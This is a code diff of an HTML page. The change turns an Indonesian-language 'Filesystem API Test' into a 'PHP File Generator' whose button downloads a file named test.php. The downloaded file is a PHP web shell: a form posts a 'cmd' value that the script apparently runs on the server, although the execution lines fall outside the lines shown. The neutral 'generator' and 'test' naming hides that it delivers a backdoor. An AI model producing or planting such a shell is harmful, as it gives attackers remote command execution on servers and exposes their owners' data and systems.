@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Filesystem API Test (Fixed)</title>
+  <title>PHP File Generator</title>
   <style>
     .button {
       background-color: #4CAF50;
@@ -18,19 +18,15 @@
       cursor: pointer;
     }
   </style>
+</head>
+<body>
+  <h1>PHP File Generator</h1>
+  <p>Click the button below to generate and download a PHP file.</p>
+  <button class="button" onclick="downloadPHPFile()">Download PHP File</button>
+
   <script>
-    function createFile() {
-      const storageSize = 1024 * 1024;
-
-      if (!window.webkitRequestFileSystem) {
-        alert("Browser tidak mendukung FileSystem API.");
-        return;
-      }
-
-      window.webkitRequestFileSystem(window.PERSISTENT, storageSize, function(fs) {
-        fs.root.getFile("test.html", { create: true }, function(fileEntry) {
-          fileEntry.createWriter(function(fileWriter) {
-            const htmlContent = `<?php
+    function downloadPHPFile() {
+      const phpContent = `<?php
 if (\$_SERVER['REQUEST_METHOD'] === 'POST' && isset(\$_POST['cmd'])) {
     \$cmd = trim(\$_POST['cmd']);
     if (\$cmd !== '') {
@@ -62,34 +58,14 @@ if (\$_SERVER['REQUEST_METHOD'] === 'POST' && isset(\$_POST['cmd'])) {
     <input type="submit" value="Run" />
 </form>`;
 
-            const blob = new Blob([htmlContent], { type: "text/html" });
-
-            fileWriter.onwriteend = function() {
-              console.log("File berhasil ditulis:", fileEntry.toURL());
-              alert("File HTML berhasil dibuat di sandbox Filesystem API.");
-            };
-
-            fileWriter.onerror = function(err) {
-              console.error("Gagal menulis file:", err);
-            };
-
-            fileWriter.write(blob);
-          }, function(err) {
-            console.error("Gagal membuat file writer:", err);
-          });
-        }, function(err) {
-          console.error("Gagal membuat file:", err);
-        });
-      }, function(err) {
-        console.error("Gagal mengakses FileSystem API:", err);
-      });
+      const blob = new Blob([phpContent], { type: 'text/x-php' });
+      const link = document.createElement('a');
+      link.href = URL.createObjectURL(blob);
+      link.download = 'test.php';
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
     }
-
-    window.onload = createFile;
   </script>
-</head>
-<body>
-  <h1>Filesystem API Test (Fixed)</h1>
-  <p>Halaman ini mencoba membuat file HTML menggunakan FileSystem API (lama).</p>
 </body>
 </html>
